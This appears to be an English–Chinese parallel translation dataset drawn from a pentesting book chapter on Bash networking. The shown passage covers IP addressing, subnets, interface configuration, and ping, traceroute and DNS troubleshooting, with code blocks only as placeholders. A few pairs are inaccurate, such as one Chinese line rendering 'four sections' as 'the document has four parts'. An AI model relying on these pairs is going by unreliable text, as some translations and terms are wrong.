- en: '6'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '6'
- en: Bash Networking
  id: totrans-1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Bash网络
- en: In [*Chapter 5*](B22229_05.xhtml#_idTextAnchor089) , you learned how to use
    functions to make your code more robust. This chapter will build on previous chapters
    by applying what you’ve learned to real-world pentesting tasks related to networking
    and network exploitation.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 在[*第5章*](B22229_05.xhtml#_idTextAnchor089)中，您学会了如何使用函数使代码更加健壮。本章将在前几章的基础上，通过将所学应用到与网络和网络利用相关的实际渗透测试任务中来进行扩展。
- en: This chapter dives into the world of **Bash networking** . We’ll take a tour
    of commands and scripts that let you configure, troubleshoot, and exploit networking
    in a Unix/Linux environment. You’ll learn not just how to access network configuration
    details and interact with network components but also how to use Bash scripting
    to exploit vulnerable network services. We’ll start with the basics, then gradually
    step into more advanced concepts, all the way to network traffic analysis.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 本章深入探讨**Bash网络**。我们将对一些命令和脚本进行巡览，这些命令和脚本能够让你在Unix/Linux环境中配置、排查故障并利用网络。你将不仅学习如何访问网络配置细节和与网络组件互动，还将学习如何使用Bash脚本利用脆弱的网络服务。我们将从基础开始，然后逐步深入更高级的概念，直到网络流量分析。
- en: By the end of this chapter, you’ll be able to identify network configuration
    details, understand network diagnostics in Bash, enumerate network services in
    Bash, automate network scanning tools and chain attack sequences, and explore
    exploitation and post-exploitation commands in Bash scripts.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 本章结束时，您将能够识别网络配置细节，理解Bash中的网络诊断，枚举Bash中的网络服务，自动化网络扫描工具和链式攻击序列，并探索Bash脚本中的利用和后期利用命令。
- en: 'In this chapter, we’re going to cover the following main topics:'
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将覆盖以下主要主题：
- en: Networking basics with Bash
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Bash中的网络基础
- en: Scripting network enumeration with Bash
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Bash脚本进行网络枚举
- en: Bash techniques for network exploitation
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 网络利用的Bash技巧
- en: Bash scripting for network traffic analysis
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Bash脚本用于网络流量分析
- en: Technical requirements
  id: totrans-10
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: The code for this chapter can be found at [https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter06](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter06)
    .
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 本章的代码可以在[https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter06](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter06)找到。
- en: Following along with one of the exploitation exercises will require you to download
    and run **vulhub** ( [https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub)
    ) with the **Shellshock** exploit configured.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 跟随其中一个利用练习，您需要下载并运行已配置**Shellshock**漏洞的**vulhub**（[https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub)）。
- en: 'Install the required tools in Kali by running the following command in your
    terminal:'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 在Kali中安装所需工具，方法是在终端运行以下命令：
- en: '[PRE0]'
  id: totrans-14
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Having configured your system to follow along, let’s dive into an exploration
    of networking in Bash in the next section.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 在配置好系统并跟随操作之后，我们将在下一节深入探索Bash中的网络内容。
- en: Networking basics with Bash
  id: totrans-16
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Bash中的网络基础
- en: 'Alright, let’s dive into understanding **Internet Protocol** ( **IP** ) addresses
    and **subnets** . There are two types of IP addresses: **IP Version 4** ( **IPv4**
    ) and **IPv6** . You’ll usually be working with IPv4 addresses, but it helps to
    know the basics of both.'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 好的，让我们深入了解**互联网协议**（**IP**）地址和**子网**。IP地址有两种类型：**IP版本4**（**IPv4**）和**IPv6**。您通常会使用IPv4地址，但了解两者的基础知识也是有帮助的。
- en: IP addresses are like street addresses. They help devices communicate with each
    other over a network. An IP address is a unique number assigned to each device
    connected to a netw ork.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: IP地址就像街道地址。它们帮助设备通过网络相互通信。每个设备在连接到网络时都会被分配一个唯一的IP地址。
- en: Understanding IP addresses and subnets (IPv4)
  id: totrans-19
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 理解IP地址和子网（IPv4）
- en: IPv4 is the fourth version of the IP. It is the most widely used version of
    the IP in the world today. IPv4 addresses are 32-bit numerical values expressed
    in four **octets** separated by periods. Each octet can range from **0** to **255**
    , making up a total of over four billion unique addresses.
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: IPv4是IP的第四个版本。它是当前世界上最广泛使用的IP版本。IPv4地址是32位数字值，以四个**八位字节**（octets）表示，每个八位字节之间用句号隔开。每个八位字节的范围是**0**到**255**，总共可以组成超过四十亿个唯一地址。
- en: 'An IPv4 address consists of four sections separated by periods. Here is an
    example of an IPv4 address: **192.168.1.1** . Let’s break it down for you:'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 一个IPv4地址由四个由句号隔开的部分组成。以下是一个IPv4地址的示例：**192.168.1.1**。让我们为您逐步解析：
- en: There are four sections, each separated by a period.
  id: totrans-22
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 该文档分为四个部分，每个部分由一个句号隔开。
- en: Each section is referred to as an octet.
  id: totrans-23
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 每个部分称为一个八位字节。
- en: '**192** represents the first octet.'
  id: totrans-24
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**192** 代表第一个八位字节。'
- en: '**168** represents the second octet.'
  id: totrans-25
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**168** 代表第二个八位字节。'
- en: '**1** represents the third octet.'
  id: totrans-26
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**1** 代表第三个八位字节。'
- en: '**1** represents the fourth octet.'
  id: totrans-27
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**1** 代表第四个八位字节。'
- en: Each octet in an IPv4 address can have a value between **0** and **255** , making
    it a 32-bit address space.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: IPv4地址中的每个八位字节的值可以在**0**和**255**之间，形成一个32位的地址空间。
- en: 'The command to review your IP address in Bash is **ip address** , which can
    be abbreviated to **ip a** . You may encounter the deprecated **ifconfig** command
    on older Linux systems, which performs the same function. Let’s see an example:'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 在Bash中查看IP地址的命令是**ip address**，可以缩写为**ip a**。在较老的Linux系统中，你可能会遇到已经弃用的**ifconfig**命令，它执行相同的功能。让我们看一个示例：
- en: '![Figure 6.1 – An example command to get the IP address information](image/B22229_06_01.jpg)'
  id: totrans-30
  prefs: []
  type: TYPE_IMG
  zh: '![图6.1 – 获取IP地址信息的示例命令](image/B22229_06_01.jpg)'
- en: Figure 6.1 – An example command to get the IP address information
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 图6.1 – 获取IP地址信息的示例命令
- en: The preceding command output shows two network interfaces, **lo** and **eth0**
    . You may see different interface names on your system, and you may have more
    than two interfaces.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 上述命令输出显示了两个网络接口，**lo**和**eth0**。你可能会在你的系统上看到不同的接口名称，并且可能有不止两个接口。
- en: The **lo** interface, also known as the **loopback adapter** , is a network
    component that allows a computer to send and receive data packets to itself, simulating
    a real network connection. Assigned the IP address **127.0.0.1** , commonly referred
    to as **localhost** , it enables software applications to test internal network
    communications without external network involvement, which is essential for debugging
    and development. Additionally, it enhances security by allowing services to bind
    to this address, ensuring they are only accessible locally, thus protecting them
    from external threats and unauthorized access.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: '**lo**接口，也称为**回环适配器**，是一个允许计算机将数据包发送并接收给自己的网络组件，用来模拟真实的网络连接。它被分配了IP地址**127.0.0.1**，通常称为**localhost**，使得软件应用可以在没有外部网络干预的情况下测试内部网络通信，这对于调试和开发至关重要。此外，它通过允许服务绑定到此地址，从而只能本地访问，增强了安全性，防止外部威胁和未经授权的访问。'
- en: The **eth0** interface has the **192.168.61.128** IPv4 address assigned. This
    is the network interface that my system uses to communicate on the network.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: '**eth0**接口被分配了**192.168.61.128**的IPv4地址。它是我的系统用来在网络上进行通信的网络接口。'
- en: After the IP address, you can see a forward slash ( **/** ) and a number. This
    is the **subnet mask** , sometimes referred to as the **netmask** . The subnet
    mask identifies the network address. To understand this better, we use a process
    called bitwise **ANDing** . We convert the IP address and subnet mask into binary
    and then perform a bitwise **AND** operation. The bitwise **AND** operation results
    in a **1** value only if both binary bits are **1** ; otherwise, it results in
    **0** (zero).
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 在IP地址后面，你可以看到一个斜杠（**/**）和一个数字。这就是**子网掩码**，有时也称为**netmask**。子网掩码标识网络地址。为了更好地理解这一点，我们使用一种称为按位**与**的过程。我们将IP地址和子网掩码转换成二进制，然后进行按位**与**操作。按位**与**操作仅在两个二进制位都为**1**时结果为**1**，否则结果为**0**（零）。
- en: 'Let’s use the **ipcalc** program to visualize this information. You can install
    it by running the **sudo apt install -y ipcalc** command. Let’s see an example:'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们使用**ipcalc**程序来可视化这些信息。你可以通过运行**sudo apt install -y ipcalc**命令来安装它。让我们看一个示例：
- en: '![Figure 6.2 – An example of the ipcalc command](image/B22229_06_02.jpg)'
  id: totrans-37
  prefs: []
  type: TYPE_IMG
  zh: '![图6.2 – ipcalc命令的示例](image/B22229_06_02.jpg)'
- en: Figure 6.2 – An example of the ipcalc command
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 图6.2 – ipcalc命令的示例
- en: In the preceding figure, we’ve passed the IP address and netmask as an argument
    to the **ipcalc** program. First, take a look at the structure of these addresses
    in binary. If each part is eight binary bits and there are four parts, then you
    have a total of 32 bits in an IPv4 address.
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的图中，我们将IP地址和子网掩码作为参数传递给**ipcalc**程序。首先，查看这些地址的二进制结构。如果每个部分是八位二进制位，并且有四个部分，那么IPv4地址总共有32位。
- en: The **/24** subnet mask means that the network address is 24 bits. Look at the
    line that starts with **Netmask** in the preceding figure. It shows that the network
    address is 24 bits, leaving eight bits for host addresses on this network.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: '**/24**子网掩码意味着网络地址是24位。查看前面图中以**Netmask**开头的那一行。它显示网络地址是24位，剩下8位用于该网络上的主机地址。'
- en: IP addresses representing the network address and broadcast address cannot be
    assigned to hosts. This means that on a network with a **/24** or **255.255.255.0**
    subnet mask, the network address is **192.168.61.0** , the first useable host
    address is the **HostMin** value and the last useable host address is the **HostMax**
    value.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 表示网络地址和广播地址的 IP 地址不能分配给主机。这意味着在一个 **/24** 或 **255.255.255.0** 子网掩码的网络中，网络地址是
    **192.168.61.0**，第一个可用的主机地址是 **HostMin** 值，最后一个可用的主机地址是 **HostMax** 值。
- en: Usually, a network device called a **router** takes the first useable IP address
    on a network. That would be **192.168.61.1** in this case. The last address, **192.168.61.255**
    , is a **broadcast address** . A broadcast address is the address that is used
    when a host needs to send to all IP addresses on the network. The **NetMin** and
    **NetMax** values fit between the network and broadcast addresses.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，一个名为 **路由器** 的网络设备会占用网络上第一个可用的 IP 地址。在本例中，这个地址是 **192.168.61.1**。最后一个地址，**192.168.61.255**，是
    **广播地址**。广播地址是在主机需要发送数据给网络上的所有 IP 地址时使用的地址。**NetMin** 和 **NetMax** 值位于网络地址和广播地址之间。
- en: There is much more involved in networking and network addresses, and many large
    books have been written on this subject. For our purposes, we’re going to keep
    it simple and related to the theme of this book.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 网络和网络地址的内容要复杂得多，许多大部头的书籍已经专门讨论了这个主题。为了简化起见，我们将重点与本书的主题相关，并保持简洁。
- en: Understanding IP addresses and subnets (IPv6)
  id: totrans-44
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 理解 IP 地址和子网（IPv6）
- en: IPv6, the latest version of the IP, was developed to address the exhaustion
    of IPv4 addresses by using a 128-bit address space, compared to the 32-bit space
    used in IPv4. This exponential increase in address space allows for a virtually
    limitless number of unique IP addresses, accommodating the growing number of devices
    connected to the internet. Each IPv6 address is composed of eight groups of four
    hexadecimal digits, separated by colons, which can represent a vast range of IP
    addresses, making it ideal for the expansive needs of modern networks.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: IPv6，作为 IP 的最新版本，旨在解决 IPv4 地址耗尽的问题，通过使用 128 位地址空间，相比于 IPv4 的 32 位地址空间。这种地址空间的指数级增长使得
    IP 地址几乎是无限的，可以满足越来越多的连接互联网的设备需求。每个 IPv6 地址由八组四个十六进制数字组成，组与组之间用冒号分隔，这可以表示极为广泛的
    IP 地址范围，非常适合现代网络的庞大需求。
- en: In the following figure, the IPv6 address is highlighted.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 在下图中，IPv6 地址已被高亮显示。
- en: '![Figure 6.3 – The ip command for IPv6](image/B22229_06_03.jpg)'
  id: totrans-47
  prefs: []
  type: TYPE_IMG
  zh: '![图 6.3 – IPv6 的 ip 命令](image/B22229_06_03.jpg)'
- en: Figure 6.3 – The ip command for IPv6
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.3 – IPv6 的 ip 命令
- en: 'The **ipcalc** program can also work with IPv6 addresses; however, **Sipcalc**
    has more features and displays more information about IPv6 by default. Sipcalc
    can be installed by entering the **sudo apt install -y sipcalc** command. The
    following figure shows how to use **sipcalc** :'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: '**ipcalc** 程序也可以处理 IPv6 地址；然而，**Sipcalc** 提供了更多功能，并且默认情况下显示更多关于 IPv6 的信息。可以通过输入
    **sudo apt install -y sipcalc** 命令安装 Sipcalc。以下图示展示了如何使用 **sipcalc**：'
- en: '![Figure 6.4 – The use of the sipcalc utility](image/B22229_06_04.jpg)'
  id: totrans-50
  prefs: []
  type: TYPE_IMG
  zh: '![图 6.4 – 使用 sipcalc 工具](image/B22229_06_04.jpg)'
- en: Figure 6.4 – The use of the sipcalc utility
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.4 – 使用 sipcalc 工具
- en: In the interest of staying on subject, this is as far as we’re going to go into
    IPv6 addresses. However, we will be reviewing common IPv6 attacks a little later
    in [*Chapter 10*](B22229_10.xhtml#_idTextAnchor260) .
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 为了保持话题的聚焦，我们只深入探讨到这里，关于 IPv6 地址的内容到此为止。然而，我们将在稍后的 [*第 10 章*](B22229_10.xhtml#_idTextAnchor260)
    中回顾常见的 IPv6 攻击。
- en: 'Our network interface can get an address from a **Dynamic Host Configuration
    Protocol** ( **DHCP** ) server, or it can have a static address. To determine
    how our network interface was configured, enter the following command:'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的网络接口可以从 **动态主机配置协议** (**DHCP**) 服务器获取地址，或者可以设置静态地址。要确定我们的网络接口是如何配置的，请输入以下命令：
- en: '[PRE1]'
  id: totrans-54
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Here’s an explanation:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 下面是解释：
- en: '**nmcli** : Command-line tool for controlling NetworkManager'
  id: totrans-56
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**nmcli** ：控制 NetworkManager 的命令行工具'
- en: '**device** : A subcommand of **nmcli** that lets you show and manage network
    interfaces'
  id: totrans-57
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**device** ：**nmcli** 的一个子命令，允许你显示和管理网络接口'
- en: '**show** : Show detailed information about devices'
  id: totrans-58
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**show** ：显示设备的详细信息'
- en: '**eth0** : Without an argument, all devices are examined; to get information
    for a specific device, the interface name has to be provided'
  id: totrans-59
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**eth0** ：没有参数时，所有设备都会被检查；若要获取特定设备的信息，必须提供接口名称'
- en: 'The following example shows the output on my Kali system:'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 以下示例展示了我在 Kali 系统上的输出：
- en: '![Figure 6.5 – Example nmcli command output](image/B22229_06_05.jpg)'
  id: totrans-61
  prefs: []
  type: TYPE_IMG
  zh: '![图 6.5 – 示例 nmcli 命令输出](image/B22229_06_05.jpg)'
- en: Figure 6.5 – Example nmcli command output
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.5 – 示例 nmcli 命令输出
- en: Having learned how to enumerate network settings, let’s now move forward and
    explore configuring network interfaces in Bash.
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 在学习了如何列举网络设置之后，让我们继续前进，探索如何在 Bash 中配置网络接口。
- en: Configuring network interfaces using Bash commands
  id: totrans-64
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用 Bash 命令配置网络接口
- en: Alright, let’s dive into configuring network interfaces using Bash commands.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 好的，让我们深入了解如何使用 Bash 命令配置网络接口。
- en: 'To configure a network interface using Bash commands, you can use the **ip**
    command. Here’s an example of how you can set a static IP address on an interface:'
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用 Bash 命令配置网络接口，你可以使用 **ip** 命令。以下是如何在接口上设置静态 IP 地址的示例：
- en: '[PRE2]'
  id: totrans-67
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: The **ip addr** command adds the **192.168.1.10** IP address with a subnet mask
    of **255.255.255.0** (which is represented as **/24** in CIDR notation) to the
    **eth0** interface. The **ip link** command brings the **eth0** interface up.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: '**ip addr** 命令将 **192.168.1.10** 的 IP 地址和子网掩码 **255.255.255.0**（在 CIDR 表示法中为
    **/24**）添加到 **eth0** 接口。**ip link** 命令将 **eth0** 接口启用。'
- en: 'You can also add a default gateway using the **route** command. Here’s an example:'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 你还可以使用 **route** 命令添加默认网关。以下是一个示例：
- en: '[PRE3]'
  id: totrans-70
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: This command is used to manipulate the IP routing table. This would add the
    default route and explicitly associate it with the **eth0** interface.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令用于操作 IP 路由表。这将添加默认路由并将其明确关联到 **eth0** 接口。
- en: You can view the routing table by entering the **route** command by itself.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以通过单独输入 **route** 命令来查看路由表。
- en: Remember, these commands may require root privileges to execute successfully.
    Always be cautious when making changes to network configurations.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 请记住，这些命令可能需要 root 权限才能成功执行。更改网络配置时请始终保持谨慎。
- en: Troubleshooting network connectivity with Bash tools
  id: totrans-74
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用 Bash 工具排除网络连接问题
- en: When you’re having network connectivity problems on a Linux system, it can be
    frustrating trying to figure out what’s wrong. Luckily, there are a number of
    powerful command line tools built right in that can help you diagnose and resolve
    network issues quickly. In this section, we’ll walk through some of the most useful
    network troubleshooting commands and show examples of how to use them effectively.
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 当你在 Linux 系统上遇到网络连接问题时，试图找出问题所在可能会让人沮丧。幸运的是，有许多强大的命令行工具可以帮助你快速诊断和解决网络问题。在本节中，我们将介绍一些最有用的网络故障排除命令，并展示如何有效使用它们。
- en: The first step in troubleshooting network problems is to make sure your network
    interfaces are up and configured properly. The **ip** command is the modern replacement
    for the older **ifconfig** command and provides detailed information about your
    network interfaces and settings.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 排查网络问题的第一步是确保你的网络接口已启动并正确配置。**ip** 命令是较旧的 **ifconfig** 命令的现代替代品，提供关于网络接口和设置的详细信息。
- en: 'To list details of a network interface, use the **ip link** command, as shown
    in the following figure:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 要列出网络接口的详细信息，请使用 **ip link** 命令，如下图所示：
- en: '![Figure 6.6 – Using ip link to show network interface configuration](image/B22229_06_06.jpg)'
  id: totrans-78
  prefs: []
  type: TYPE_IMG
  zh: '![图 6.6 – 使用 ip link 显示网络接口配置](image/B22229_06_06.jpg)'
- en: Figure 6.6 – Using ip link to show network interface configuration
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.6 – 使用 ip link 显示网络接口配置
- en: 'This will show you the name, state ( **UP** / **DOWN** ), and MAC address of
    each interface. If an interface is down that should be up, you can enable it:'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 这将显示每个接口的名称、状态（**UP** / **DOWN**）和 MAC 地址。如果某个接口应该是启用状态但却处于关闭状态，你可以启用它：
- en: '[PRE4]'
  id: totrans-81
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'To view the IP address configuration of an interface, you can do this:'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 要查看接口的 IP 地址配置，你可以这样做：
- en: '[PRE5]'
  id: totrans-83
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: This displays the interface’s IP address, netmask, broadcast address, and more.
    If the interface doesn’t have an IP when it should, there may be a problem with
    DHCP or your static IP configuration in the **/** **etc/network/interfaces** file.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 这将显示接口的 IP 地址、子网掩码、广播地址等信息。如果接口应该有 IP 地址但没有，那么可能是 DHCP 或 **/etc/network/interfaces**
    文件中的静态 IP 配置有问题。
- en: Once you’ve verified the interfaces are up and have IPs, the next step is testing
    basic connectivity to other hosts using **ping** . Ping uses **Internet Control
    Message Protocol** ( **ICMP** ) echo requests to test if a remote host is reachable.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你确认接口已启动并具有 IP 地址，下一步是使用 **ping** 测试与其他主机的基本连通性。Ping 使用 **Internet Control
    Message Protocol**（**ICMP**）回显请求来测试远程主机是否可达。
- en: 'To ping a host by IP address or hostname, see the following example:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 要通过 IP 地址或主机名 ping 一个主机，请参见以下示例：
- en: '[PRE6]'
  id: totrans-87
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'If the host is reachable, you’ll see replies that look like the following:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 如果主机可达，您将看到类似以下的回复：
- en: '[PRE7]'
  id: totrans-89
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'If the host isn’t reachable, you’ll eventually see a timeout message such as
    the following:'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 如果主机无法访问，您最终会看到类似下面的超时消息：
- en: '[PRE8]'
  id: totrans-91
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: This could indicate a problem with the remote host, or a connectivity issue
    along the network path.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 这可能表示远程主机存在问题，或网络路径上存在连接问题。
- en: 'To get more information about where along the path the connectivity breaks
    down, use the **traceroute** command. **traceroute** shows you each network *hop*
    between your host and the destination, along with the latency to each hop, as
    shown in the following figure:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 若要获取有关连接在哪一段路径上断开更多信息，请使用**traceroute**命令。**traceroute**会显示从主机到目标之间的每一个网络*跳数*，并显示每个跳数的延迟，如下图所示：
- en: '![Figure 6.7 – An example of the traceroute program in action](image/B22229_06_07.jpg)'
  id: totrans-94
  prefs: []
  type: TYPE_IMG
  zh: '![图 6.7 – traceroute 程序执行示例](image/B22229_06_07.jpg)'
- en: Figure 6.7 – An example of the traceroute program in action
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.7 – traceroute 程序执行示例
- en: The output shows the IP, latency, and reverse DNS name (if available) of each
    router between the source and destination. This can help identify problems such
    as high latency links or unresponsive routers.
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 输出显示了源和目标之间每个路由器的 IP 地址、延迟和反向 DNS 名称（如果可用）。这有助于识别问题，如高延迟链路或未响应的路由器。
- en: If the trace stops abruptly before reaching the destination, there is likely
    a connectivity issue at that hop. The problem could be caused by a downlink, misconfigured
    router, or firewall blocking the traffic. If you see asterisks, it typically means
    the device is not responding or ICMP packets are being blocked.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 如果跟踪在到达目标之前突然停止，通常说明在该跳数处存在连接问题。问题可能由下行链路故障、配置错误的路由器或防火墙阻塞流量引起。如果看到星号，通常意味着设备未响应或ICMP包被阻塞。
- en: Many connectivity issues are caused by problems with DNS name resolution. If
    hostnames aren’t resolving to IP addresses correctly, you won’t be able to connect
    to them. The **nslookup** and **dig** tools let you test DNS lookups and view
    the results.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 许多连接问题是由 DNS 名称解析问题引起的。如果主机名无法正确解析为 IP 地址，您将无法连接到它们。**nslookup** 和 **dig** 工具可以帮助您测试
    DNS 查找并查看结果。
- en: 'To look up the IP for a hostname with nslookup, enter the **nslookup** command
    followed by the hostname, as shown next :'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 若要使用 nslookup 查找主机名的 IP 地址，请输入 **nslookup** 命令后跟主机名，如下所示：
- en: '![Figure 6.8 – An example of the nslookup command](image/B22229_06_08.jpg)'
  id: totrans-100
  prefs: []
  type: TYPE_IMG
  zh: '![图 6.8 – nslookup 命令示例](image/B22229_06_08.jpg)'
- en: Figure 6.8 – An example of the nslookup command
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.8 – nslookup 命令示例
- en: This will query your configured DNS server and show the IP address the name
    resolves to. The **-query** option (or its shorthand **-q** ) allows you to specify
    the type of DNS record you want to look up. Here are some examples.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 这将查询您配置的 DNS 服务器，并显示名称解析到的 IP 地址。**-query** 选项（或其简写 **-q**）允许您指定要查找的 DNS 记录类型。以下是一些示例。
- en: 'This looks up the IPv4 address associated with **example.com** :'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 这查找与 **example.com** 关联的 IPv4 地址：
- en: '[PRE9]'
  id: totrans-104
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'This retrieves the IPv6 address for **example.com** :'
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 这将检索 **example.com** 的 IPv6 地址：
- en: '[PRE10]'
  id: totrans-106
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: 'This finds the mail servers responsible for handling email for **example.com**
    :'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 这将查找处理 **example.com** 邮件的邮件服务器：
- en: '[PRE11]'
  id: totrans-108
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: 'This lists the authoritative name servers for the **example.com** domain:'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 这列出了 **example.com** 域的权威名称服务器：
- en: '[PRE12]'
  id: totrans-110
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: 'For more detailed information, use **dig** , as shown here:'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 要获取更详细的信息，请使用 **dig**，如这里所示：
- en: '![Figure 6.9 – A demonstration of using the dig command](image/B22229_06_09.jpg)'
  id: totrans-112
  prefs: []
  type: TYPE_IMG
  zh: '![图 6.9 – 使用 dig 命令的演示](image/B22229_06_09.jpg)'
- en: Figure 6.9 – A demonstration of using the dig command
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6.9 – 使用 dig 命令的演示
- en: '**dig** outputs the raw DNS response, including the query, answer, and various
    DNS flags and options. This is useful for diagnosing low-level DNS issues.'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: '**dig** 输出原始 DNS 响应，包括查询、答案以及各种 DNS 标志和选项。这对于诊断低级别 DNS 问题非常有用。'
- en: If the lookups fail or return incorrect results, there may be a problem with
    your DNS server configuration in **/etc/resolv.conf** , or the DNS servers themselves
    may be having issues.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
